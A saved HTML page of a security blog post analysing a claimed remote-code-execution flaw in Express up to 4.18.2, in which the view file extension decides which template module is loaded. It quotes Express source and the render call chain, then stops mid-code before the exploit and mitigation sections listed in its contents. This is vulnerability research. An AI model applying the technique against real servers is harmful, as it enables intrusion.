<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Express, RCE via File Extension Confusing ≤ V4.18.2" />
<meta property="og:locale" content="en" />
<meta name="description" content="This article is about the RCE vulnerability that occurs only in highly specific cases in web services using the Express framework. Express is a web framework based on Node.js" />
<meta property="og:description" content="This article is about the RCE vulnerability that occurs only in highly specific cases in web services using the Express framework. Express is a web framework based on Node.js" />
<link rel="canonical" href="http://localhost:4000/posts/RCE-Express-1/" />
<meta property="og:url" content="http://localhost:4000/posts/RCE-Express-1/" />
<meta property="og:site_name" content="Web2.0" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-12-19T06:41:53+09:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Express, RCE via File Extension Confusing ≤ V4.18.2" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-12-19T06:41:53+09:00","datePublished":"2022-12-19T06:41:53+09:00","description":"This article is about the RCE vulnerability that occurs only in highly specific cases in web services using the Express framework. Express is a web framework based on Node.js","headline":"Express, RCE via File Extension Confusing ≤ V4.18.2","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/RCE-Express-1/"},"url":"http://localhost:4000/posts/RCE-Express-1/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Express, RCE via File Extension Confusing ≤ V4.18.2 | Web2.0
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<meta name="apple-mobile-web-app-title" content="Web2.0">
<meta name="application-name" content="Web2.0">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css">


  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  
  <style>
  hr {
    background:white;
    height:1px;
    border:0;
}
.core-app-profile--audithistory--auditwrapper {
	border: 1px solid #beb3c5;
    border: 1px solid var(--color__border-l1);
    border-radius: 4px;
    background-color: var(--color__bg-l1);
    display: flex;
    flex-direction: column;
    padding: 1rem;
    cursor: pointer
}

:root,:root.dark {
    --color__label-red: #ed2360;
    --color__label-yellow: #ffd330;
    --color__label-green: #17a05a;
    --color__label-blue: #2d20e2;
    --color__label-purple: #7549ff;
    --color__label-cyan: #18b4f8;
    --color__text-primary: #e6e6e6;
    --color__text-secondary: #adabb2;
    --color__text-tertiary: #8d8a99;
    --color__text-disabled: #6b6680;
    --color__text-yellow: #ffe878;
    --color__text-destructive: #ff6a8c;
    --color__text-primary-inv: #3f3c4f;
    --color__bg-l0: #1a1825;
    --color__bg-l1: #22202d;
    --color__bg-l2: #2e2b3b;
    --color__bg-l3: #3a3649;
    --color__bg-sidebar: #22202d;
    --color__bg-main: #1a1825;
    --color__bg-hover-l0: #1e1c2b;
    --color__bg-hover-l1: #272432;
    --color__bg-hover-l2: #332f41;
    --color__bg-l0-inv: #fff;
    --color__border-l0: #322f3f;
    --color__border-l1: #322f3f;
    --color__border-l2: #403c4d;
    --color__border-l3: #4f4c5f;
    --color__border-tertiary: rgba(208,204,255,.059);
    --color__overlay: #110f19;
    --font-size__header-xl: 1.625rem;
    --font-size__header-lg: 1.5rem;
    --font-size__header-md: 1.375rem;
    --font-size__header-sm: 1.25rem;
    --font-size__core-copy: 1.125rem;
    --font-size__lg: 1.063rem;
    --font-size__md: 0.938rem;
    --font-size__sm: 0.813rem;
    --color__alert-warning-text: #ebfcff;
    --color__alert-warning-text-secondary: #a1e6ff;
    --color__alert-warning-bg: #052947;
    --color__alert-warning-border: #085f96;
    --color__alert-error-text: #fff0f2;
    --color__alert-error-text-secondary: #ffcbd5;
    --color__alert-error-bg: #650126;
    --color__alert-error-border: #c70948
}
@media(prefers-reduced-motion:no-preference) {
    a {
        transition: color .2s ease-in-out
    }
}
.core-app-profile__bodybottom {
	width:100%;
	order:3;
	display:flex;
	flex-direction:column;
	gap:2rem
}

.profile--audithistory--loadmore {
	text-align:center
}
.profile--audithistory--loadmore hr {
	height:2px;
	background:#7549ff
}
.profile--audithistory--loadmore button {
	color:#fff;
	font-size:16px;
	width:max-content;
	margin:5px auto;
	display:flex;
	flex-direction:row;
	gap:5px;
	justify-content:center;
	align-items:center;
	cursor:pointer
}
.profile--audithistory--loadmore button svg {
	width:16px;
	height:16px
}
.profile--audithistory--loadmore button svg path {
	fill:#7549ff
}
.profile--audithistory--loadmore .audithistory--unavailable {
	margin-top:1rem;
	border:2px solid #2e2b3b;
	border-radius:.25rem;
	padding:1rem
}
.profile--audithistory--loadmore .audithistory--unavailable p {
	font-size:.875rem;
	line-height:1.125rem;
	text-align:start
}
.profile--audithistory--loadmore .audithistory--unavailable p strong {
	color:#fff
}
.profile--audithistory--auditsponsorimg {
	min-width:50px;
	min-height:50px;
	max-width:50px;
	max-height:50px;
	border-radius:50%
}
.profile--audithistory--auditheading {
	position:relative;
	display:flex;
	flex-direction:row;
	gap:14px;
	left:-15px;
	align-items:flex-end
}
.profile--audithistory--auditheading--date {
	font-size:14px;
	line-height:18px
}
.profile--audithistory--auditheading--title {
	font-size:20px;
	line-height:24px;
	color:#fff
}
.profile--audithistory--monthwrapper {
	margin-top:30px
}
.profile--audithistory--auditwrapper {
	position:relative;
	height:auto;
	margin:10px 0 30px 15px
}
.profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	margin-bottom:25px
}
.profile--audithistory--heading p {
	font-size:18px;
	color:#fff;
	white-space:nowrap
}
.profile--audithistory--heading hr {
	border:1px solid #2e2b3b;
	width:100%;
	height:1px
}
.profile--auditseverity {
	position:relative
}
.profile--auditseverity--lineconnector {
	position:relative;
	left:9px;
	min-height:15px;
	width:.5px;
	background-color:#2e2b3b
}
.profile--auditseverity--lineconnector:last-of-type {
	position:absolute;
	bottom:0
}
.profile--auditseverity--ring {
	width:25px;
	height:25px;
	border-radius:50%;
	display:flex;
	align-items:center;
	justify-content:center;
	position:relative;
	left:-3px
}
.profile--auditseverity--ring--inner {
	border-radius:50%;
	width:5px;
	height:5px;
	background:#fff
}
.profile--auditseverity--severity {
	position:relative;
	display:flex;
	margin-left:45px;
	top:-24px
}
.profile--auditseverity--severity--heading {
	color:var(--color__text-primary)
}
.profile--auditseverity--severity--content {
	margin-left:8px
}
.profile--auditseverity--severity--content--flexwrapper {
	display:flex;
	column-gap:8px;
	row-gap:5px;
	align-items:center;
	flex-wrap:wrap;
	margin-bottom:5px
}
.profile--auditseverity--severity--decorator {
	min-width:4px;
	max-width:4px;
	height:auto
}
.profile--auditseverity--severity--locked {
	font-size:12px;
	display:flex;
	gap:5px;
	flex-direction:row;
	justify-content:flex-start;
	align-items:center
}
.profile--auditseverity--severity--title {
	color:#fff;
	font-weight:semibold;
	overflow-wrap:anywhere
}
.core-app-profile--audithistory--monthwrapper {
	margin-top:40px;
	display:flex;
	flex-direction:column;
	gap:1rem
}
.core-app-profile--audithistory--monthwrapper:first-child {
	margin-top:0
}
.core-app-profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	justify-content:space-between;
	font-size:var(--font-size__header-md);
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--auditwrapper {
	border: 1px solid #beb3c5;
	border-radius:4px;
	background-color:var(--color__bg-l1);
	display:flex;
	flex-direction:column;
	padding:1rem;
	cursor:pointer
}
.core-app-profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	justify-content:space-between;
	font-size:var(--font-size__header-md);
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--auditheading {
	position:relative;
	display:flex;
	flex-direction:row;
	gap:14px;
	align-items:center;
	justify-content:space-between
}
.core-app-profile--audithistory--content-wrapper {
	
	flex:1 1;
	position:relative;
	display:flex;
	flex-direction:column;
	gap:14px
}
@media(min-width:450px) {
	.core-app-profile--audithistory--content-wrapper {
		flex-direction:row;
		align-items:center;
		justify-content:space-between
	}
}
.core-app-profile--audithistory--header-wrapper {
	display:flex;
	flex-direction:row;
	gap:14px;
	align-items:center
}
.core-app-profile--audithistory--title {
	font-size:20px;
	line-height:24px;
	font-weight:700;
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--date {
  text-overflow:ellipsis
	white-space:nowrap
}
.core-app-profile--audithistory--wrapper {
	display:flex;
	flex-direction:column-reverse;
	height:100%
}
  </style>

  <!-- A placeholder to allow defining custom metadata -->

  <script src="https://code4rena.com/_next/static/chunks/app/%5B@username%5D/page-20c23029062acd7f.js"></script>
</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle">
      
        
        <img src="/assets/img/ant.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'">
      
    </a>

    <h1 class="site-title">
      <a href="/">Web2.0</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Amennnn</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <li class="nav-item">
          <a href="https://evm.pics" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i><span>ABOUT</span>
          </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://x.com/l0ptus"
          aria-label="x"
          

          

          

          
        >
          <i class="fab fa-twitter"></i>
        </a>
      
    
      

      
        <a
          href="https://blockscan.com/address/0xc39777E85d97a0B5655C62C6378F00D494feAce1"
          aria-label="wallet"
          

          

          

          
        >
          <i class="fab fa-ethereum"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    style="background-color:#030014"
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                Home
              </a>
            </span>

          
        
          
        
          
            
              <span>Express, RCE via File Extension Confusing ≤ V4.18.2</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Express, RCE via File Extension Confusing ≤ V4.18.2</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1671399713"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Dec 19, 2022
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://x.com/l0ptus">anonymous</a>
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1119 words"
>
  <em>6 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <ul>
  <li><a href="#summary">Summary</a></li>
  <li><a href="#function-call-procedure">Function call procedure</a></li>
  <li><a href="#the-analysis">The analysis</a>
    <ul>
      <li><a href="#libapplicationjsl548l610">/lib/application.js#L548L610</a></li>
      <li><a href="#libviewjsl52l95">/lib/view.js#L52L95</a></li>
      <li><a href="#libapplicationjsl655l661">/lib/application.js#L655L661</a></li>
      <li><a href="#libviewjsl133l136">/lib/view.js#L133L136</a></li>
    </ul>
  </li>
  <li><a href="#how-to-trigger-an-rce">How to trigger an RCE</a>
    <ul>
      <li><a href="#code-for-testing">Code for Testing</a></li>
      <li><a href="#check-ejs-extension-management-logic">Check ejs extension management logic</a></li>
      <li><a href="#exploit">Exploit</a></li>
    </ul>
  </li>
  <li><a href="#mitigation">Mitigation</a></li>
</ul>

<hr />
<h1 id="summary">Summary</h1>

<p>Express.js, or simply Express, is a web framework for Node.js, released as free and open source software licensed under the MIT license. It is being called the de facto standard server framework of Node.js.</p>

<p>I started to analyze it. While analyzing several pieces of code, I found a way to trigger an RCE vulnerability via confusing file extenstion in the render() function.</p>

<p>The express framework internally calls template libraries such as ejs, Handlebars, and dot using the require() function. Confusion arises in this process.</p>

<hr />
<h1 id="function-call-procedure">Function call procedure</h1>

<pre><code class="language-txt">render() → View() → tryRender() → View.prototype.render → this.engine()
</code></pre>

<hr />
<h1 id="the-analysis">The analysis</h1>

<h2 id="libapplicationjsl548l610"><span class="me-2">/lib/application.js#L548L610</span><a href="#libapplicationjsl548l610" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre></td><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="nx">render</span> <span class="o">=</span> <span class="kd">function</span> <span class="nf">render</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">options</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">cache</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">cache</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">done</span> <span class="o">=</span> <span class="nx">callback</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">engines</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">engines</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">opts</span> <span class="o">=</span> <span class="nx">options</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">renderOptions</span> <span class="o">=</span> <span class="p">{};</span>
  <span class="kd">var</span> <span class="nx">view</span><span class="p">;</span>

  <span class="c1">// support callback function as second arg</span>
  <span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">options</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">function</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">done</span> <span class="o">=</span> <span class="nx">options</span><span class="p">;</span>
    <span class="nx">opts</span> <span class="o">=</span> <span class="p">{};</span>
  <span class="p">}</span>

  <span class="c1">// merge app.locals</span>
  <span class="nf">merge</span><span class="p">(</span><span class="nx">renderOptions</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">locals</span><span class="p">);</span>

  <span class="c1">// merge options._locals</span>
  <span class="k">if </span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">_locals</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">merge</span><span class="p">(</span><span class="nx">renderOptions</span><span class="p">,</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">_locals</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// merge options</span>
  <span class="nf">merge</span><span class="p">(</span><span class="nx">renderOptions</span><span class="p">,</span> <span class="nx">opts</span><span class="p">);</span>

  <span class="c1">// set .cache unless explicitly provided</span>
  <span class="k">if </span><span class="p">(</span><span class="nx">renderOptions</span><span class="p">.</span><span class="nx">cache</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">renderOptions</span><span class="p">.</span><span class="nx">cache</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">enabled</span><span class="p">(</span><span class="dl">'</span><span class="s1">view cache</span><span class="dl">'</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// primed cache</span>
  <span class="k">if </span><span class="p">(</span><span class="nx">renderOptions</span><span class="p">.</span><span class="nx">cache</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">view</span> <span class="o">=</span> <span class="nx">cache</span><span class="p">[</span><span class="nx">name</span><span class="p">];</span>
  <span class="p">}</span>

  <span class="c1">// view</span>
  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">view</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">View</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">view</span><span class="dl">'</span><span class="p">);</span>

    <span class="nx">view</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">View</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="p">{</span>
      <span class="na">defaultEngine</span><span class="p">:</span> <span class="k">this</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">view engine</span><span class="dl">'</span><span class="p">),</span>
      <span class="na">root</span><span class="p">:</span> <span class="k">this</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">views</span><span class="dl">'</span><span class="p">),</span>
      <span class="na">engines</span><span class="p">:</span> <span class="nx">engines</span>
    <span class="p">});</span>

    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">view</span><span class="p">.</span><span class="nx">path</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">var</span> <span class="nx">dirs</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nf">isArray</span><span class="p">(</span><span class="nx">view</span><span class="p">.</span><span class="nx">root</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">view</span><span class="p">.</span><span class="nx">root</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">1</span>
        <span class="p">?</span> <span class="dl">'</span><span class="s1">directories "</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">view</span><span class="p">.</span><span class="nx">root</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="dl">'</span><span class="s1">", "</span><span class="dl">'</span><span class="p">)</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">" or "</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">view</span><span class="p">.</span><span class="nx">root</span><span class="p">[</span><span class="nx">view</span><span class="p">.</span><span class="nx">root</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"</span><span class="dl">'</span>
        <span class="p">:</span> <span class="dl">'</span><span class="s1">directory "</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">view</span><span class="p">.</span><span class="nx">root</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"</span><span class="dl">'</span>
      <span class="kd">var</span> <span class="nx">err</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Failed to lookup view "</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">name</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">" in views </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">dirs</span><span class="p">);</span>
      <span class="nx">err</span><span class="p">.</span><span class="nx">view</span> <span class="o">=</span> <span class="nx">view</span><span class="p">;</span>
      <span class="k">return</span> <span class="nf">done</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// prime the cache</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">renderOptions</span><span class="p">.</span><span class="nx">cache</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">cache</span><span class="p">[</span><span class="nx">name</span><span class="p">]</span> <span class="o">=</span> <span class="nx">view</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="c1">// render</span>
  <span class="nf">tryRender</span><span class="p">(</span><span class="nx">view</span><span class="p">,</span> <span class="nx">renderOptions</span><span class="p">,</span> <span class="nx">done</span><span class="p">);</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></div></div>
<p>The <code class="language-plaintext highlighter-rouge">render()</code> function calls View function if the view variable is empty. And when the function ends, it calls <code class="language-plaintext highlighter-rouge">tryRender()</code> function.</p>

<h2 id="libviewjsl52l95"><span class="me-2">/lib/view.js#L52L95</span><a href="#libviewjsl52l95" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td><td class="rouge-code"><pre><span class="cm">/*
var path = require('path');
var extname = path.extname;
*/</span>

<span class="kd">function</span> <span class="nf">View</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">options</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">opts</span> <span class="o">=</span> <span class="nx">options</span> <span class="o">||</span> <span class="p">{};</span>

  <span class="k">this</span><span class="p">.</span><span class="nx">defaultEngine</span> <span class="o">=</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">defaultEngine</span><span class="p">;</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">ext</span> <span class="o">=</span> <span class="nf">extname</span><span class="p">(</span><span class="nx">name</span><span class="p">);</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">name</span><span class="p">;</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">root</span> <span class="o">=</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">root</span><span class="p">;</span>

  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">ext</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">defaultEngine</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">No default engine was specified and no extension was provided.</span><span class="dl">'</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">var</span> <span class="nx">fileName</span> <span class="o">=</span> <span class="nx">name</span><span class="p">;</span>

  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">ext</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// get extension from default engine name</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">ext</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">defaultEngine</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">.</span><span class="dl">'</span>
      <span class="p">?</span> <span class="dl">'</span><span class="s1">.</span><span class="dl">'</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">defaultEngine</span>
      <span class="p">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">defaultEngine</span><span class="p">;</span>

    <span class="nx">fileName</span> <span class="o">+=</span> <span class="k">this</span><span class="p">.</span><span class="nx">ext</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">opts</span><span class="p">.</span><span class="nx">engines</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">ext</span><span class="p">])</span> <span class="p">{</span>
    <span class="c1">// load engine</span>
    <span class="kd">var</span> <span class="nx">mod</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">ext</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
